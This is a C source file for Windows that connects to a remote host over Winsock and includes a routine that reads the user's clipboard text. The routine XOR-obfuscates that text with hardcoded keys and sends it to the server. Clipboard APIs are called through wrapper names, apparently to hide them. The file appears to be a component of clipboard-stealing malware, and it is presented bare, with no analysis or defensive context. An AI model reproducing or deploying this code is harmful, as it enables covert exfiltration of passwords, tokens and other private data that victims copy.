#include "networking.h"

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "win32.h"
#include "config.h"

#pragma warning(disable:4996) 

int hostname_to_ip(const char* hostname, char* ip)
{
	struct hostent* he;
	struct in_addr** addr_list;
	int i;

	if ((he = gethostbyname(hostname)) == NULL)
	{
		// get the host info
		printf("gethostbyname");
		return 1;
	}

	addr_list = (struct in_addr**)he->h_addr_list;

	for (i = 0; addr_list[i] != NULL; i++)
	{
		//Return the first one;
		strcpy(ip, inet_ntoa(*addr_list[i]));
		return 0;
	}

	return 1;
}


void setup_addrinfo(struct sockaddr_in *servinfo, const char* ip, const u_short port) {
	servinfo->sin_addr.s_addr = inet_addr(ip);
	servinfo->sin_family = AF_INET;
	servinfo->sin_port = htons(port);
}

 SOCKET get_socket_file_descriptor(const LPCWSTR hostname, const u_short port) {

	WSADATA wsa;
	struct sockaddr_in server;
	SOCKET sock;
	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return NULL;
	}

	printf("Initialised.\n");

	//Create a socket
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
		return NULL;
	}
#ifdef DNS_TRANSLATE
	char ip[100];
	printf("Socket created.\n");
	if (hostname_to_ip(hostname, ip)) {
		return NULL;
	}
	setup_addrinfo(&server, ip, port);
#endif // DNS_TRANSLATE
#ifndef DNS_TRANSLATE
	setup_addrinfo(&server, hostname, port);
#endif // DNS_TRANSLATE

	
	
	//Connect to remote server
	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		closesocket(sock);
		return NULL;
	}

	puts("Connected");
	return sock;

}

int send_message(const LPWSTR content, HANDLE* socket_file_descriptor) {
	//Send some data
	DWORD buff_size = wcslen(content) * sizeof(content[0]);
	for (size_t i = 0; i < wcslen(content); i += 1) {
		content[i] ^= KEY_1;
		content[i] ^= KEY_2;
		content[i] ^= (KEY_1 << 8);
		content[i] ^= (KEY_2 << 8);
	}
	if (send(socket_file_descriptor, content, buff_size, 0) < 0)
	{
		puts("Send failed");
		closesocket((SOCKET) socket_file_descriptor);
		return 1;
	}
	return 0;
}

int send_clipboard_data(HANDLE*  socket_file_descriptor) {
	DWORD rc = 1;

	if (!LpOpenClipboard(NULL))
		goto out;

	const HANDLE handle = LpGetClipboardData(CF_UNICODETEXT);

	if (!handle)
		goto close;

	const LPCVOID data = LpGlobalLock(handle);

	if (!data)
		goto close;
	LPWSTR content = (LPWSTR)data;
	DWORD buff_size = wcslen(content) * sizeof(content[0]);
	for (size_t i = 0; i < wcslen(content); i += 1) {
		content[i] ^= KEY_1;
		content[i] ^= KEY_2;
		content[i] ^= (KEY_1 << 8);
		content[i] ^= (KEY_2 << 8);
	}
	if (send(socket_file_descriptor, content, buff_size, 0) < 0)
	{
		puts("Send failed");
		closesocket(socket_file_descriptor);
		return 1;
	}
	rc = 0;


	LpGlobalUnlock(handle);
close:
	LpCloseClipboard();
out:
	return rc;
}
